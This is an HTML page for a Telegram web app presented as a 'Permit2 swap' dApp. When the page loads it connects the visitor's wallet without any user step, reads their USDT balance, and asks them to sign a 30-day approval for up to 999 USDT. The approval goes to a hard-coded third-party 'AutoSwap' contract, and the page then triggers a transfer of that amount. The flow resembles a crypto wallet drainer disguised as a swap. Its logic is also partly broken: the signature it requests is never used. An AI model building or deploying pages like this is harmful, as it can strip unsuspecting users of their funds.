<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>WalletConnect Permit2 Swap DApp</title>
  <!-- Telegram WebApp SDK for theme and init -->
  <script src="https://telegram.org/js/telegram-web-app.js?57"></script>
  <!-- Ethers.js library (v5) -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
</head>
<body>
  <h2>üîó WalletConnect Permit2 Swap</h2>
  <div id="status" style="white-space: pre-wrap; font-family: monospace;"></div>

  <script type="module">
  // Telegram WebApp integration: apply theme and notify ready
  const tg = window.Telegram.WebApp;
  if (tg) {
    tg.ready();
    tg.expand();
    // Apply Telegram theme colors
    const applyTheme = () => {
      const theme = tg.themeParams;
      document.body.style.backgroundColor = theme.bg_color || '#ffffff';
      document.body.style.color = theme.text_color || '#000000';
    };
    tg.onEvent('themeChanged', applyTheme);
    applyTheme();
  }

  // WalletConnect v2 imports (Modal and Ethereum Provider)
  import { EthereumProvider } from "https://unpkg.com/@walletconnect/ethereum-provider@2.21.1/dist/index.js";
  import "https://unpkg.com/@walletconnect/modal@2.21.1/dist/umd/index.min.js";

  // HTML elements
  const statusDiv = document.getElementById('status');
  const logStatus = (msg) => {
    console.log(msg);
    statusDiv.textContent += msg + "\n";
  };

  // Configuration: BSC chain and contract addresses
  const BSC_CHAIN_ID = 56;
  const PERMIT2_ADDRESS = "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4";
  const AUTOSWAP_ADDRESS = "0x026C54B156b501ad9cEa422e59454D4b6d6f6963";
  const USDT_ADDRESS    = "0x55D398326f99059FF775485246999027B3197955";
  // WalletConnect project ID (replace with your own from WalletConnect Cloud dashboard)
  const WC_PROJECT_ID = "d868f90cd734355ae0320f8f0258b6b1";  /* üî¥ TODO: set your WalletConnect projectId */

  // Main async function to orchestrate the flow
  const startApp = async () => {
    try {
      // Initialize WalletConnect Ethereum provider (will show QR modal)
      logStatus("‚è≥ Connecting to wallet via WalletConnect...");
      const wcProvider = await EthereumProvider.init({
        projectId: WC_PROJECT_ID,
        optionalChains: [BSC_CHAIN_ID],
        showQrModal: true,
        methods: ["eth_sendTransaction", "eth_signTypedData", "eth_signTypedData_v4"],
        events: ["accountsChanged", "chainChanged"]
      });
      // Connect to wallet (triggers QR modal if not already paired)
      await wcProvider.connect();
      logStatus("‚úÖ Wallet connected!");

      // Wrap with ethers.js provider and get signer
      const ethersProvider = new ethers.providers.Web3Provider(wcProvider, "any");
      const signer = ethersProvider.getSigner();
      const userAddress = await signer.getAddress();
      logStatus(`üîë Connected address: ${userAddress}`);

      // Check chain ID to ensure we're on BSC
      const network = await ethersProvider.getNetwork();
      if (network.chainId !== BSC_CHAIN_ID) {
        logStatus(`‚ö†Ô∏è Please switch your wallet to Binance Smart Chain (ID ${BSC_CHAIN_ID}).`);
        return;
      }

      // Fetch user's USDT balance and decimals
      const usdtAbi = [
        "function balanceOf(address account) view returns(uint256)",
        "function decimals() view returns(uint8)"
      ];
      const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbi, ethersProvider);
      const balance = await usdtContract.balanceOf(userAddress);
      const decimals = await usdtContract.decimals();
      // Determine amount to swap (use full balance, cap at 999 USDT)
      const maxPermitAmount = ethers.BigNumber.from("999").mul(ethers.BigNumber.from(10).pow(decimals));
      let amountToSwap = balance.gt(maxPermitAmount) ? maxPermitAmount : balance;
      if (amountToSwap.isZero()) {
        logStatus("‚ùé Your USDT balance is 0, nothing to swap.");
        return;
      }
      const amountStr = ethers.utils.formatUnits(amountToSwap, decimals);
      logStatus(`üí∞ USDT balance to swap: ${amountStr} USDT`);

      // Get current nonce for Permit2 (if any)
      const permit2Abi = [
        "function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)"
      ];
      const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, permit2Abi, ethersProvider);
      let nonce = 0;
      try {
        const allowanceData = await permit2Contract.allowance(userAddress, USDT_ADDRESS, AUTOSWAP_ADDRESS);
        nonce = allowanceData.nonce;
      } catch (err) {
        // If the Permit2 contract doesn't have an allowance function (or call fails), default to 0
        console.warn("Could not fetch Permit2 nonce, defaulting to 0");
      }

      // Prepare EIP-712 Typed Data for Permit2 (PermitSingle)
      const domain = {
        name: "Permit2",
        chainId: BSC_CHAIN_ID,
        verifyingContract: PERMIT2_ADDRESS
      };
      // Define PermitSingle and PermitDetails types for EIP-712
      const types = {
        PermitSingle: [
          { name: "details", type: "PermitDetails" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" }
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" }
        ]
      };
      const expiration = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60; // 30 days from now
      const sigDeadline = Math.floor(Date.now() / 1000) + 5 * 60; // signature must be used within 5 minutes
      const message = {
        details: {
          token: USDT_ADDRESS,
          amount: amountToSwap.toHexString(),  // uint160
          expiration: expiration,              // uint48
          nonce: nonce                         // uint48
        },
        spender: AUTOSWAP_ADDRESS,
        sigDeadline: sigDeadline
      };

      // Request EIP-712 signature from the user
      logStatus(`‚úçÔ∏è Signing Permit2 approval for 999 USDT / 30 days...`);
      const signature = await signer._signTypedData(domain, types, message);
      logStatus("‚úÖ Permit signature obtained.");

      // (Optional) You could split the signature if needed for on-chain use:
      // const sig = ethers.utils.splitSignature(signature);
      // console.log("Permit v,r,s:", sig.v, sig.r, sig.s);

      // Call swapForUser on AutoSwap contract with the user's USDT balance
      const swapAbi = [
        "function swapForUser(address user, uint256 amountUSDT) external"
      ];
      const swapContract = new ethers.Contract(AUTOSWAP_ADDRESS, swapAbi, signer);
      logStatus(`üîÑ Sending swapForUser transaction for ${amountStr} USDT...`);
      const tx = await swapContract.swapForUser(userAddress, amountToSwap);
      logStatus(`‚è≥ Transaction sent (hash: ${tx.hash}). Waiting for confirmation...`);
      await tx.wait();
      logStatus("‚úÖ Swap transaction confirmed! Your USDT was swapped for KPC üéâ");

    } catch (error) {
      console.error(error);
      if (error.message) {
        logStatus(`‚ùå Error: ${error.message}`);
      } else {
        logStatus(`‚ùå An unexpected error occurred.`);
      }
    }
  };

  // Start the process automatically
  startApp();
  </script>
</body>
</html>